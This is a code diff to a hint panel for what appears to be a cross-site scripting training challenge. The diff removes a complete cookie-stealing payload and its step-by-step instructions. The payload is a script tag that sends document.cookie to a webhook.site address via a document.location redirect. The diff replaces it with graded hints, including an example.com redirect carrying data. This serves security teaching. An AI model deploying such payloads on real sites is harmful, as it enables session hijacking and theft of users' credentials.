@@ -73,16 +73,16 @@ export default function XSSHints() {
             </AccordionSummary>
             <AccordionDetails>
               <Typography level="body-sm">
-                <strong>Goal:</strong> Retrieve sensitive data available during review.
-                <br />
+                First, can you find any information about the admin?
                 <br />
                 <strong>Techniques:</strong>
-                <br />• Access cookies: <code>document.cookie</code>
-                <br />• Check for special flags in page content
-                <br />• Examine localStorage/sessionStorage
+                <br />• Check for special information in source code
+                <br />
+                If you can't find any information, think about what the "Report this message" button
+                is for.
                 <br />
                 <br />
-                (The review environment may have special privileges)
+                The admin may review those reported messages, how can you get their token?
               </Typography>
             </AccordionDetails>
           </Accordion>
@@ -98,37 +98,31 @@ export default function XSSHints() {
                 <br />
                 <strong>Solution:</strong> Send data to an external server:
                 <br />• Use webhook services like webhook.site to capture data
-                <br />• Redirect the admin's browser to your webhook with cookie data
+                <br />• Construct a payload that redirects the admin's browser to your webhook with
+                cookie data
               </Typography>
             </AccordionDetails>
           </Accordion>
 
           <Accordion>
             <AccordionSummary>
-              <Typography level="title-sm">Complete Solution</Typography>
+              <Typography level="title-sm">Stealing Cookies</Typography>
             </AccordionSummary>
             <AccordionDetails>
               <Typography level="body-sm">
-                <strong>Final Payload:</strong>
-                <br />
-                <code>
-                  {`<script>document.location = "https://webhook.site/your_webhook_id?cookie=" + document.cookie</script>`}
-                </code>
+                You need to capture the admin's session when they view your message.
                 <br />
                 <br />
-                <strong>Steps:</strong>
+                <strong>Approach:</strong>
                 <br />
-                1. Go to https://webhook.site and get your unique webhook ID
+                • Use JavaScript to send the cookie to a server you control
+                <br />• The <code>document.cookie</code> property contains all cookies for the
+                current page
+                <br />• The <code>document.location="https://example.com?data=xxx"</code> can
+                redirect the browser to the example.com while sending data
                 <br />
-                2. Replace "your_webhook_id" with your actual webhook ID
                 <br />
-                3. Submit this payload as a message
-                <br />
-                4. Report the message
-                <br />
-                5. Check your webhook.site for the admin's cookie data
-                <br />
-                6. Look for special flags in the captured data
+                Final hint: you may find <code>&lt;script&gt;</code> tag useful here
               </Typography>
             </AccordionDetails>
           </Accordion>
